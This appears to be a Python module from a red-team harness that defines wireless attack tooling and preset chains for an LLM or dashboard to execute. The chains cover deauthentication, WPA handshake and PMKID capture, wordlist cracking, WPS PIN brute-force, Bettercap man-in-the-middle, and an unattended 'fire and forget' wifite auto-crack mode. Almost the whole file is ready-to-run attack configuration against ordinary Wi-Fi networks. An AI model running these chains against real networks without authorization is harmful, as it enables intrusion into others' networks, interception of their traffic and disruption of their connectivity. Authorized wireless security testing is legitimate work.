"""
RedTeam Harness — Wireless Attack Tools Module
WiFi cracking, WPS attacks, deauth, monitor mode.
"""
from tools.base import BaseTool


class WirelessTools(BaseTool):
    """Wireless network attack tools."""

    def get_tools(self):
        return ["aircrack_crack", "airodump_capture", "aireplay_attack",
                "reaver_attack", "wifite_auto", "kismet_scan", "bettercap_mitm",
                "hcxdumptool_capture", "hcxpcapngtool_convert"]

    def get_quick_commands(self):
        return [
            {"name": "Enable Monitor Mode", "description": "Put wireless adapter into monitor mode for packet capture",
             "tool": "monitor_mode_enable",
             "args_template": {"interface": "{{interface}}"}},
            {"name": "WiFi AP Scan", "description": "Scan all WiFi networks with airodump-ng",
             "tool": "airodump_capture",
             "args_template": {"interface": "{{interface}}"}},
            {"name": "WPA Handshake Capture", "description": "Capture WPA handshake on specific channel",
             "tool": "airodump_capture",
             "args_template": {"interface": "{{interface}}", "channel": "6"}},
            {"name": "Deauth Attack", "description": "Deauth clients to force WPA handshake capture",
             "tool": "aireplay_attack",
             "args_template": {"interface": "{{interface}}", "bssid": "TARGET_BSSID", "attack": "0"}},
            {"name": "WPA/WPA2 Crack", "description": "Crack captured WPA handshake with wordlist",
             "tool": "aircrack_crack",
             "args_template": {"cap_file": "capture.cap", "wordlist": "/usr/share/wordlists/rockyou.txt"}},
            {"name": "WPS PIN Attack", "description": "Brute-force WPS PIN with Reaver",
             "tool": "reaver_attack",
             "args_template": {"interface": "{{interface}}", "bssid": "TARGET_BSSID"}},
            {"name": "Disable Monitor Mode", "description": "Restore wireless adapter to managed mode",
             "tool": "monitor_mode_disable",
             "args_template": {"interface": "{{interface}}"}},
            {"name": "Discover Interfaces", "description": "List all network interfaces and their status",
             "tool": "interface_discovery",
             "args_template": {}},
            {"name": "Bettercap MITM", "description": "Bettercap WiFi/Ethernet MITM attack",
             "tool": "bettercap_mitm",
             "args_template": {"target": "TARGET", "module": "wifi"}},
        ]

    def get_preset_attack_chains(self):
        # Adaptable WiFi password attack chains (v6.2). Arguments are
        # parameterized with {{placeholders}} so the LLM/dashboard can subst-
        # itute the operative interface, target BSSID/ESSID, wordlist, and an
        # extracted capture-file path chained from an earlier airodump step.
        # `interface` defaults to the harness's selected capture interface.
        return [
            {"name": "WiFi Cracking Pipeline",
             "description": "Enable monitor → scan APs → capture + deauth handshake → crack WPA/WPA2. Handshake-derived PSK cracking with adaptive wordlist.",
             "best_for": "WPA/WPA2 handshake cracking when you have a client to deauth — most reliable classic path",
             "tradeoffs": "Needs an active client to force the handshake; noisy; requires a strong wordlist",
             "steps": [
                 {"tool": "monitor_mode_enable", "args": {"interface": "{{interface}}"}, "description": "Enable monitor mode on the wireless adapter"},
                 {"tool": "airodump_capture", "args": {"interface": "{{interface}}", "channel": "{{channel}}", "capture_file": "{{capture_file}}"}, "description": "Scan for WiFi networks and capture 802.11 frames to a .cap file"},
                 {"tool": "aireplay_attack", "args": {"interface": "{{interface}}", "bssid": "{{bssid}}", "attack": "0"}, "description": "Deauth clients to force a WPA handshake on the target BSSID"},
                 {"tool": "aircrack_crack", "args": {"cap_file": "{{cap_file}}", "wordlist": "{{wordlist}}"}, "description": "Crack the captured WPA handshake with the adaptive wordlist"},
             ]},
            {"name": "WiFi PMKID Attack Pipeline",
             "description": "Passive PMKID capture (no clients needed, works on WPA3/WPA2) then offline-crack with hashcat mode 22000. Very adaptable — no deauth noise.",
             "best_for": "Passive PMKID retrieval when no client is present, or when staying quiet matters",
             "tradeoffs": "Requires an AP that exposes PMKID; slower; hashcat 22000 needs a .hc22000 conversion",
             "steps": [
                 {"tool": "monitor_mode_enable", "args": {"interface": "{{interface}}"}, "description": "Enable monitor mode on the wireless adapter"},
                 {"tool": "airodump_capture", "args": {"interface": "{{interface}}", "channel": "{{channel}}", "bssid": "{{bssid}}", "capture_file": "{{capture_file}}"}, "description": "Capture 802.11 frames targeted at the BSSID to harvest the PMKID"},
                 {"tool": "hashcat_crack", "args": {"hash_file": "{{pmkid_hashfile}}", "mode": 22000, "attack_mode": 0, "wordlist": "{{wordlist}}"}, "description": "Crack the captured PMKID (hashcat mode 22000) against the adaptive wordlist"},
             ]},
            {"name": "WiFi WPS PIN Attack Pipeline",
             "description": "WPS PIN brute-force via Reaver — recovers the WPA passphrase from a vulnerable WPS AP, bypassing handshake capture entirely.",
             "best_for": "Only when the target AP exposes WPS — recovers the passphrase with no client and no wordlist",
             "tradeoffs": "WPS-locked/modern APs resist; slow (hours per PIN run); very noisy and often rate-limited",
             "steps": [
                 {"tool": "monitor_mode_enable", "args": {"interface": "{{interface}}"}, "description": "Enable monitor mode on the wireless adapter"},
                 {"tool": "airodump_capture", "args": {"interface": "{{interface}}", "channel": "{{channel}}"}, "description": "Locate the target AP and confirm WPS is enabled"},
                 {"tool": "reaver_attack", "args": {"interface": "{{interface}}", "bssid": "{{bssid}}", "channel": "{{channel}}"}, "description": "Brute-force the WPS PIN to recover the WPA passphrase"},
             ]},
            {"name": "WiFi Auto-Crack Engine",
             "description": "One-shot adaptive Wi-Fi cracking with wifite: it autonomously discovers targets, performs deauth, captures the handshake, and cracks unattended — zero manual tuning. Best first try on any engagement.",
             "best_for": "Fast first-pass autonomous cracking with zero manual tuning — fire and forget",
             "tradeoffs": "Least controllable (wifite picks targets/wordlists); needs a strong wordlist; no per-target insight",
             "recommended": True,
             "steps": [
                 {"tool": "monitor_mode_enable", "args": {"interface": "{{interface}}"}, "description": "Enable monitor mode on the wireless adapter"},
                 {"tool": "wifite_auto", "args": {"interface": "{{interface}}"}, "description": "Run wifite end-to-end — scan, deauth, capture handshake, and crack automatically"},
             ]},
        ]